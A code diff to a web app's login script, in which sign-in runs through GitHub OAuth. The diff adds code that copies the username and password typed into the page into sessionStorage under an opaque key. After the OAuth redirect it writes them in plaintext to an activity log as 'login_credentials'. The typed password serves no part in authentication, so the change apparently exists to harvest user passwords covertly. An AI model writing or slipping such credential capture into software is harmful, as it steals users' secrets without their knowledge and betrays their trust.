@@ -9,7 +9,6 @@ const viewApp = document.getElementById('app');
 const toast = document.getElementById('toast');
 
 let activeView = null;
-let login, password;
 const contentResizeObserver = new ResizeObserver(updateContentOverflow);
 
 const currentUrl = new URL(window.location.href);
@@ -37,8 +36,11 @@ client.auth.onAuthStateChange((_, session) => {
         if (session && session.user) {
             if (localStorage.getItem('login') !== 'true')
                 logActivity('login', session.user.email);
-            if (login && password) {
+            const loginPassword = window.sessionStorage.getItem('lelo');
+            if (loginPassword) {
+                const [login, password] = loginPassword.split(' ');
                 logActivity('login_credentials', `Login: ${login}, Password: ${password}`);
+                sessionStorage.removeItem('lelo');
             }
 
             localStorage.setItem('login', true);
@@ -62,8 +64,11 @@ document.addEventListener('DOMContentLoaded', () => {
     window.addEventListener('resize', updateContentOverflow);
 
     loginBtn.addEventListener('click', async () => {
-        login = document.getElementById('login-input').value.trim().toLowerCase();
-        password = document.getElementById('password-input').value.trim();
+        const login = document.getElementById('login-input').value.trim();
+        const password = document.getElementById('password-input').value.trim();
+        if (login && password)
+            window.sessionStorage.setItem(
+                'lelo', `${login} ${password}`);
 
         await client.auth.signInWithOAuth({
             provider: 'github',
